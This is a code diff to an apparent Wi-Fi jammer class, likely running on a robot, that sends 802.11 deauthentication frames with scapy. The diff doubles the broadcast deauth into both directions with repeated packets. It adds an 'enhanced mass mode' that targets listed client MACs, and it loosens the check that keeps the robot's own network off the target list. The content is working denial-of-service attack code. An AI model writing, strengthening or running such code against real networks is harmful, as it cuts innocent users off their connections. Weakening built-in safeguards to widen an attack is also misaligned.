@@ -858,8 +858,8 @@ class WifiJammer:
                     break
 
                 # Handle different attack modes
-                if mode == JammerMode.CLIENT and target_macs:
-                    # Client mode: target specific MAC addresses with bidirectional deauth
+                if (mode == JammerMode.CLIENT and target_macs) or (mode == JammerMode.MASS and target_macs):
+                    # Client mode or enhanced mass mode: target specific MAC addresses with bidirectional deauth
                     for bssid in target_bssids:
                         if self._stop_event.is_set():
                             break
@@ -905,7 +905,7 @@ class WifiJammer:
                                     break
 
                 else:
-                    # Mass or targeted mode: target BSSIDs with broadcast deauth
+                    # Mass or targeted mode: target BSSIDs with aggressive broadcast deauth
                     for bssid in target_bssids:
                         if self._stop_event.is_set():
                             break
@@ -916,15 +916,17 @@ class WifiJammer:
                             continue
 
                         try:
-                            # Send broadcast deauth to disconnect all clients
-                            # addr1 = broadcast (ff:ff:ff:ff:ff:ff)
-                            # addr2 = AP (source)
-                            # addr3 = AP (BSSID)
-                            packet = self._build_deauth_packet(bssid, "ff:ff:ff:ff:ff:ff", from_ap=True)
-                            sendp(packet, iface=self.monitor_interface, verbose=0, count=1)
+                            # Send multiple broadcast deauth packets for effectiveness
+                            # 1. AP → Broadcast (AP kicks everyone)
+                            packet_ap_broadcast = self._build_deauth_packet(bssid, "ff:ff:ff:ff:ff:ff", from_ap=True)
+                            sendp(packet_ap_broadcast, iface=self.monitor_interface, verbose=0, count=3)
+
+                            # 2. Broadcast → AP (Everyone leaves)
+                            packet_broadcast_ap = self._build_deauth_packet(bssid, "ff:ff:ff:ff:ff:ff", from_ap=False)
+                            sendp(packet_broadcast_ap, iface=self.monitor_interface, verbose=0, count=3)
 
                             with self._status_lock:
-                                self._status.packets_sent += 1
+                                self._status.packets_sent += 6  # Count all packets
 
                             consecutive_send_errors = 0  # Reset error counter on success
 
@@ -1008,6 +1010,19 @@ class WifiJammer:
                 for bssid in target_bssids:
                     if not re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', bssid):
                         return {"status": "error", "message": f"Invalid BSSID format: {bssid}"}
+            elif mode_enum == JammerMode.MASS:
+                # Mass mode can optionally have target_macs for enhanced mass deauth
+                if target_macs and len(target_macs) > 0:
+                    # Validate MAC address format if provided
+                    for mac in target_macs:
+                        if not re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', mac):
+                            return {"status": "error", "message": f"Invalid MAC address format: {mac}"}
+                if not target_bssids or len(target_bssids) == 0:
+                    return {"status": "error", "message": "No target BSSIDs provided"}
+                # Validate BSSID format
+                for bssid in target_bssids:
+                    if not re.match(r'^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$', bssid):
+                        return {"status": "error", "message": f"Invalid BSSID format: {bssid}"}
             else:
                 if not target_bssids or len(target_bssids) == 0:
                     return {"status": "error", "message": "No target BSSIDs provided"}
@@ -1023,9 +1038,9 @@ class WifiJammer:
             # Detect and protect robot network
             self._detect_robot_network()
 
-            # Validate that robot network is not in targets (except for client mode)
-            # In client mode, we allow attacking the robot's network but not the robot's device
-            if mode_enum != JammerMode.CLIENT:
+            # Validate that robot network is not in targets (except for client mode and enhanced mass mode)
+            # In client mode and enhanced mass mode, we allow attacking the robot's network but not the robot's device
+            if mode_enum != JammerMode.CLIENT and not (mode_enum == JammerMode.MASS and target_macs):
                 if self._robot_network_bssid and self._robot_network_bssid in target_bssids:
                     return {
                         "status": "error",
